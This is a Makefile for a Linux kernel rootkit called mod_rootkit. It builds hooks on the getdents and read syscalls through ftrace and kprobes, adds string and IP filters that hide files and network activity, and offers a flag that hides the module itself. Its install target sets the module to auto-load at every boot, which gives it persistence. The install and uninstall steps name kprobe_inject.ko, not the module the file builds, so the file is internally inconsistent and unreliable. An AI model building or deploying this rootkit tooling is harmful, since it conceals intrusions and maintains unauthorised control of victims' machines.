MODULE_NAME := mod_rootkit

STRING_EXCLUDES ?=
NET_EXCLUDES ?=
HIDE_MODULE ?= 0


obj-m += $(MODULE_NAME).o
$(MODULE_NAME)-objs := src/mod_rootkit.o \
                      src/hooks/x64_sys_getdents.o \
                      src/hooks/x64_sys_read.o \
                      src/utils/ftrace_utils.o \
                      src/utils/kprobe_utils.o \
                      src/utils/proc_utils.o \
                      src/utils/excludes/ip_filtering.o \
                      src/utils/excludes/string_filtering.o

EXTRA_CFLAGS += -I$(PWD)/include -DMODULE_NAME=\"$(MODULE_NAME)\" -DSTRING_EXCLUDES=\"$(STRING_EXCLUDES)\" -DNET_EXCLUDES=\"$(NET_EXCLUDES)\" 


ifeq ($(HIDE_MODULE),1)
  EXTRA_CFLAGS += -DHIDE_MODULE
else ifneq ($(HIDE_MODULE),0)
  $(error Invalid value for HIDE_MODULE: '$(HIDE_MODULE)'. Use 0 or 1.)
endif


all:
	$(MAKE) -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
clean:
	$(MAKE) -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
install: # install to autoload at boot
	@echo "[+] Installing kernel module..."
	sudo mkdir -p /lib/modules/$(shell uname -r)/kernel/drivers/extra
	sudo cp kprobe_inject.ko /lib/modules/$(shell uname -r)/kernel/drivers/extra/
	sudo depmod -a
	@echo "[+] Creating auto-load config for systemd..."
	echo "kprobe_inject" | sudo tee /etc/modules-load.d/kprobe_inject.conf > /dev/null
	@echo "[✓] Module installed and will auto-load at boot!"
uninstall:
	@echo "[-] Removing module and autoload config..."
	sudo rm -f /lib/modules/$(shell uname -r)/kernel/drivers/extra/kprobe_inject.ko
	sudo rm -f /etc/modules-load.d/kprobe_inject.conf
	sudo depmod -a
	@echo "[✓] Uninstalled cleanly"
